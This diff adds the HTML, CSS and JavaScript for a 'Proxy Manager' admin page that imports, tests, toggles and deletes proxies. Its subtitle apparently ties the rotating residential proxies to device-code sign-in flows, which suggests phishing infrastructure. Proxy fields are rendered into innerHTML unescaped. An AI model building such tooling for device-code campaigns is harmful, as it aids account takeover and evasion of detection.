@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Proxy Manager – VGenius C Engine</title>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="assets/css/admin.css">
+
+    <style>
+        .proxy-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 20px;
+        }
+
+        .proxy-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .proxy-row:last-child {
+            border-bottom: none;
+        }
+
+        .proxy-status {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            flex-shrink: 0;
+        }
+
+        .proxy-status.active {
+            background: #00ffcc;
+            box-shadow: 0 0 8px rgba(0, 255, 204, 0.5);
+        }
+
+        .proxy-status.inactive {
+            background: #71717a;
+        }
+
+        .proxy-status.failed {
+            background: #ef4444;
+        }
+
+        .proxy-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .proxy-host {
+            font-family: var(--font-heading);
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .proxy-meta {
+            font-size: 11px;
+            color: var(--muted);
+            margin-top: 2px;
+        }
+
+        .proxy-stats {
+            display: flex;
+            gap: 16px;
+            font-size: 11px;
+            color: var(--muted);
+        }
+
+        .proxy-stats span {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .proxy-actions {
+            display: flex;
+            gap: 6px;
+        }
+
+        .btn-test {
+            background: rgba(59, 130, 246, 0.1);
+            color: #3b82f6;
+            border: 1px solid rgba(59, 130, 246, 0.3);
+        }
+
+        .btn-test:hover {
+            background: rgba(59, 130, 246, 0.2);
+        }
+
+        .btn-test.testing {
+            opacity: 0.6;
+            pointer-events: none;
+        }
+
+        .import-area {
+            width: 100%;
+            min-height: 120px;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 12px;
+            color: var(--text-main);
+            font-size: 12px;
+            font-family: monospace;
+            resize: vertical;
+            outline: none;
+        }
+
+        .import-area:focus {
+            border-color: var(--accent);
+        }
+
+        .stat-box {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 16px;
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--accent);
+            font-family: var(--font-heading);
+        }
+
+        .stat-label {
+            font-size: 11px;
+            color: var(--muted);
+            margin-top: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+        }
+
+        .empty-proxies {
+            text-align: center;
+            padding: 40px;
+            color: var(--muted);
+        }
+
+        .empty-proxies i {
+            font-size: 48px;
+            margin-bottom: 12px;
+            opacity: 0.3;
+        }
+    </style>
+</head>
+
+<body>
+
+    <aside class="main-sidebar" id="mainSidebar"></aside>
+    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
+    <nav class="main-header navbar"></nav>
+
+    <main class="content-wrapper">
+
+        <div class="page-header">
+            <div>
+                <h1 class="page-title" style="margin:0;">
+                    <i class="fas fa-network-wired" style="color:var(--accent);margin-right:8px;"></i>
+                    Proxy Manager
+                </h1>
+                <p style="color:var(--muted);font-size:12px;margin-top:4px;">
+                    Rotating residential proxies for device code flows.
+                </p>
+            </div>
+        </div>
+
+        <!-- Stats -->
+        <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:24px;">
+            <div class="stat-box">
+                <div class="stat-value" id="statTotal">0</div>
+                <div class="stat-label">Total</div>
+            </div>
+
+            <div class="stat-box">
+                <div class="stat-value" id="statActive" style="color:#00ffcc;">0</div>
+                <div class="stat-label">Active</div>
+            </div>
+
+            <div class="stat-box">
+                <div class="stat-value" id="statFailed" style="color:#ef4444;">0</div>
+                <div class="stat-label">Failed</div>
+            </div>
+
+            <div class="stat-box">
+                <div class="stat-value" id="statSuccess">0</div>
+                <div class="stat-label">Success</div>
+            </div>
+        </div>
+
+        <!-- Import Section -->
+        <div class="proxy-card" style="margin-bottom:24px;">
+            <h3 style="margin:0 0 12px;font-family:var(--font-heading);font-size:14px;">
+                <i class="fas fa-upload" style="color:var(--accent);margin-right:8px;"></i>
+                Import Proxies
+            </h3>
+
+            <p style="font-size:11px;color:var(--muted);margin-bottom:12px;">
+                Paste proxies in format:
+                <code style="background:rgba(0,255,204,0.1);padding:2px 6px;border-radius:4px;">
+                    username:password@host:port
+                </code>
+                (one per line)
+            </p>
+
+            <textarea
+                class="import-area"
+                id="importArea"
+                placeholder="user1:pass1@proxy1.com:8080&#10;user2:pass2@proxy2.com:8080&#10;host3:port3 (no auth)"></textarea>
+
+            <div style="display:flex;gap:8px;margin-top:12px;">
+                <button class="btn-accent-sm" onclick="importProxies()">
+                    <i class="fas fa-upload"></i> Import
+                </button>
+
+                <button class="btn-outline" onclick="document.getElementById('importArea').value=''">
+                    <i class="fas fa-eraser"></i> Clear
+                </button>
+            </div>
+
+            <div id="importResult" style="margin-top:12px;font-size:12px;"></div>
+        </div>
+
+        <!-- Proxy List -->
+        <div class="proxy-card">
+
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
+                <h3 style="margin:0;font-family:var(--font-heading);font-size:14px;">
+                    <i class="fas fa-list" style="color:var(--accent);margin-right:8px;"></i>
+                    Proxies
+                </h3>
+
+                <button
+                    class="btn-outline"
+                    style="padding:6px 12px;font-size:11px;"
+                    onclick="loadProxies()">
+                    <i class="fas fa-sync"></i> Refresh
+                </button>
+            </div>
+
+            <div id="proxyList">
+                <div class="empty-proxies">
+                    <i class="fas fa-network-wired"></i>
+                    <p>No proxies added yet.</p>
+                </div>
+            </div>
+
+        </div>
+
+    </main>
+
+    <script src="assets/js/admin.js"></script>
+
+    <script>
+        const token = getToken();
+
+        if (!token) {
+            window.location.href = "/admin-panel";
+        }
+
+        initShared('proxies');
+
+        async function loadProxies() {
+            try {
+                const res = await fetch(`${API}/proxies`, {
+                    headers: adminHeaders()
+                });
+
+                const data = await res.json();
+
+                // Update stats
+                document.getElementById('statTotal').textContent = data.stats?.total || 0;
+                document.getElementById('statActive').textContent = data.stats?.active || 0;
+                document.getElementById('statFailed').textContent = data.stats?.failed || 0;
+                document.getElementById('statSuccess').textContent = data.stats?.total_success || 0;
+
+                // Render list
+                const list = document.getElementById('proxyList');
+
+                if (!data.proxies || !data.proxies.length) {
+                    list.innerHTML =
+                        '<div class="empty-proxies"><i class="fas fa-network-wired"></i><p>No proxies added yet.</p></div>';
+                    return;
+                }
+
+                list.innerHTML = data.proxies.map(p => `
+                    <div class="proxy-row">
+                        <div class="proxy-status ${p.status}"></div>
+
+                        <div class="proxy-info">
+                            <div class="proxy-host">
+                                ${p.proxy_username ? '<i class="fas fa-lock" style="font-size:10px;margin-right:4px;"></i>' : ''}
+                                ${p.proxy_host}:${p.proxy_port}
+                            </div>
+
+                            <div class="proxy-meta">
+                                ${p.proxy_type.toUpperCase()} • Added ${formatDate(p.created_at)}
+                            </div>
+
+                            <div class="proxy-stats">
+                                <span>
+                                    <i class="fas fa-check" style="color:#00ffcc;"></i>
+                                    ${p.success_count}
+                                </span>
+
+                                <span>
+                                    <i class="fas fa-times" style="color:#ef4444;"></i>
+                                    ${p.fail_count}
+                                </span>
+
+                                <span>
+                                    <i class="fas fa-clock"></i>
+                                    ${p.last_used ? formatDate(p.last_used) : 'Never'}
+                                </span>
+                            </div>
+                        </div>
+
+                        <div class="proxy-actions">
+
+                            <button
+                                class="btn-test"
+                                id="testBtn${p.id}"
+                                onclick="testProxy(${p.id})"
+                                style="padding:6px 10px;font-size:10px;border-radius:6px;cursor:pointer;">
+                                <i class="fas fa-plug"></i> Test
+                            </button>
+
+                            ${p.status === 'active'
+                                ? `<button class="btn-outline" style="padding:6px 10px;font-size:10px;border-radius:6px;cursor:pointer;" onclick="toggleProxy(${p.id},'inactive')"><i class="fas fa-pause"></i></button>`
+                                : `<button class="btn-outline" style="padding:6px 10px;font-size:10px;border-radius:6px;cursor:pointer;" onclick="toggleProxy(${p.id},'active')"><i class="fas fa-play"></i></button>`
+                            }
+
+                            <button
+                                class="btn-danger-sm"
+                                style="padding:6px 10px;font-size:10px;border-radius:6px;cursor:pointer;"
+                                onclick="deleteProxy(${p.id})">
+                                <i class="fas fa-trash"></i>
+                            </button>
+
+                        </div>
+                    </div>
+                `).join('');
+
+            } catch (e) {
+                console.error('Failed to load proxies:', e);
+                showToast('Failed to load proxies', true);
+            }
+        }
+
+        async function importProxies() {
+            const text = document.getElementById('importArea').value.trim();
+
+            if (!text) {
+                showToast('Paste proxy list first', true);
+                return;
+            }
+
+            const btn = event.target;
+
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Importing...';
+
+            try {
+                const res = await fetch(`${API}/proxies/import`, {
+                    method: 'POST',
+                    headers: adminHeaders(),
+                    body: JSON.stringify({
+                        proxies: text
+                    })
+                });
+
+                const data = await res.json();
+
+                const result = document.getElementById('importResult');
+
+                if (data.success) {
+                    result.innerHTML = `
+                        <span style="color:#00ffcc;">
+                            <i class="fas fa-check"></i>
+                            Imported ${data.results.success} proxies.
+                            ${data.results.duplicates} duplicates skipped.
+                            ${data.results.failed} failed.
+                        </span>
+                    `;
+
+                    document.getElementById('importArea').value = '';
+                    loadProxies();
+
+                } else {
+                    result.innerHTML = `
+                        <span style="color:#ef4444;">
+                            <i class="fas fa-times"></i>
+                            ${data.error}
+                        </span>
+                    `;
+                }
+
+            } catch (e) {
+                showToast('Import failed: ' + e.message, true);
+
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-upload"></i> Import';
+            }
+        }
+
+        async function testProxy(id) {
+            const btn = document.getElementById('testBtn' + id);
+
+            btn.classList.add('testing');
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Testing...';
+
+            try {
+                const res = await fetch(`${API}/proxies/${id}/test`, {
+                    method: 'POST',
+                    headers: adminHeaders()
+                });
+
+                const data = await res.json();
+
+                if (data.success) {
+                    showToast(`Proxy working! External IP: ${data.externalIp || 'N/A'} (${data.responseTime}ms)`);
+                } else {
+                    showToast(`Proxy failed: ${data.message}`, true);
+                }
+
+            } catch (e) {
+                showToast('Test failed: ' + e.message, true);
+
+            } finally {
+                btn.classList.remove('testing');
+                btn.innerHTML = '<i class="fas fa-plug"></i> Test';
+            }
+        }
+
+        async function toggleProxy(id, status) {
+            try {
+                await fetch(`${API}/proxies/${id}/status`, {
+                    method: 'PUT',
+                    headers: adminHeaders(),
+                    body: JSON.stringify({
+                        status
+                    })
+                });
+
+                showToast(`Proxy ${status}`);
+                loadProxies();
+
+            } catch (e) {
+                showToast('Failed to update proxy', true);
+            }
+        }
+
+        async function deleteProxy(id) {
+            showConfirm({
+                title: 'Delete Proxy',
+                message: 'Are you sure you want to delete this proxy?',
+                confirmText: 'Delete',
+
+                onConfirm: async () => {
+                    try {
+                        await fetch(`${API}/proxies/${id}`, {
+                            method: 'DELETE',
+                            headers: adminHeaders()
+                        });
+
+                        showToast('Proxy deleted');
+                        loadProxies();
+
+                    } catch (e) {
+                        showToast('Delete failed', true);
+                    }
+                }
+            });
+        }
+
+        function formatDate(d) {
+            if (!d) return '—';
+
+            const date = new Date(d);
+            const now = new Date();
+            const diff = (now - date) / 1000;
+
+            if (diff < 60) return 'just now';
+            if (diff < 3600) return Math.floor(diff / 60) + 'm ago';
+            if (diff < 86400) return Math.floor(diff / 3600) + 'h ago';
+
+            return Math.floor(diff / 86400) + 'd ago';
+        }
+
+        loadProxies();
+    </script>
+
+</body>
+
+</html>
